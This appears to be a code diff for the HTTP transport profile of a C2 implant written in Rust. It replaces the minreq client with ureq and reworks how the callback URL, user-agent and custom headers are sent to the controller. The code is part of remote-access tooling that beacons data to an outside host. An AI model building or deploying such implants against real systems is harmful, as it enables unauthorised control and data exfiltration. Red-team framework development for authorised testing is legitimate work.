@@ -1,11 +1,16 @@
 use crate::profiles::C2Profile;
 use base64::prelude::{Engine as _, BASE64_STANDARD};
-use std::error::Error;
+use std::{error::Error, str::FromStr};
+use ureq::{
+    http::HeaderName,
+    tls::{RootCerts, TlsConfig},
+};
 
 /// Struct holding information for the HTTP profile
 pub struct HTTPProfile {
     callback_host: String,
     aes_key: Option<Vec<u8>>,
+    client: ureq::Agent,
 }
 
 impl HTTPProfile {
@@ -18,6 +23,14 @@ impl HTTPProfile {
         Self {
             aes_key,
             callback_host: host.to_string(),
+            client: ureq::Agent::config_builder()
+                .tls_config(
+                    TlsConfig::builder()
+                        .root_certs(RootCerts::PlatformVerifier)
+                        .build(),
+                )
+                .build()
+                .new_agent(),
         }
     }
 }
@@ -25,17 +38,25 @@ impl HTTPProfile {
 impl C2Profile for HTTPProfile {
     /// Required implementation for sending data to the C2
     fn c2send(&mut self, data: &str) -> Result<String, Box<dyn Error>> {
-        // Send an HTTP post request with the data
-        http_post(
-            format!(
+        let mut req = self
+            .client
+            .post(format!(
                 "{}:{}/{}",
                 self.callback_host,
                 profilevars::cb_port(),
                 profilevars::post_uri()
-            )
-            .as_str(),
-            data,
-        )
+            ))
+            .header("user-agent", profilevars::useragent());
+
+        let headers = profilevars::headers();
+        let req_headers = req.headers_mut().unwrap();
+        req_headers.extend(
+            headers
+                .into_iter()
+                .map(|(key, val)| (HeaderName::from_str(&key).unwrap(), val.parse().unwrap())),
+        );
+
+        Ok(req.send(data)?.into_body().read_to_string()?)
     }
 
     /// Gets the AES key from the HTTPProfile
@@ -47,37 +68,6 @@ impl C2Profile for HTTPProfile {
     fn set_aes_key(&mut self, new_key: Vec<u8>) {
         self.aes_key = Some(new_key);
     }
-}
-
-/// Generic http POST wrapper returning the body of the result
-/// * `url` - URL for the post request
-/// * `body` - Body of the post request
-fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
-    // Create a new post request with the configured user agent
-    let mut req = minreq::post(url)
-        .with_header("User-Agent", profilevars::useragent())
-        .with_body(body);
-
-    // Add any additional headers
-    if let Some(headers) = profilevars::headers() {
-        for (key, val) in headers.iter() {
-            req = req.with_header(key, val);
-        }
-    }
-
-    // Send the post request
-    let res = req.send()?;
-
-    // Check the status code
-    if res.status_code != 200 {
-        return Err(std::io::Error::new(
-            std::io::ErrorKind::ConnectionRefused,
-            "Failed to make post request",
-        )
-        .into());
-    }
-
-    Ok(res.as_str()?.to_string())
 }
 
 /// Configuration variables specific to the HTTP C2 profile
@@ -105,15 +95,18 @@ pub mod profilevars {
     }
 
     // Helper function to get the other headers
-    pub fn headers() -> Option<HashMap<String, String>> {
-        let mut headers: HashMap<String, String> = serde_json::from_str(env!("headers")).unwrap();
-        headers.remove("User-Agent");
-
-        if !headers.is_empty() {
-            Some(headers)
-        } else {
-            None
-        }
+    pub fn headers() -> HashMap<String, String> {
+        let headers: HashMap<String, String> = serde_json::from_str(env!("headers")).unwrap();
+        headers
+            .into_iter()
+            .filter_map(|(key, val)| {
+                if key.eq_ignore_ascii_case("user-agent") {
+                    None
+                } else {
+                    Some((key.to_ascii_lowercase(), val))
+                }
+            })
+            .collect::<_>()
     }
 
     // Helper function to get the C2 configured callback host
